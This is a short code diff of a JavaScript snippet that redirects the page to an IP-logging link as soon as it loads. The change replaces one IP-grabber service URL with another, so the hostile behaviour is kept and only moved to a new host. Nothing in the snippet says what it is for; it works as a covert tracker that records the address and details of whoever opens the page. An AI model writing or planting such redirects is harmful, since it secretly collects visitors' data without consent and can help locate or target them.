@@ -1,5 +1,5 @@
 var wind = () => {
-  document.location.href = 'https://iplogger.org/2Dxhm6'
+  document.location.href = 'https://02ip.ru/2Dxhm6'
 }
 
 wind()
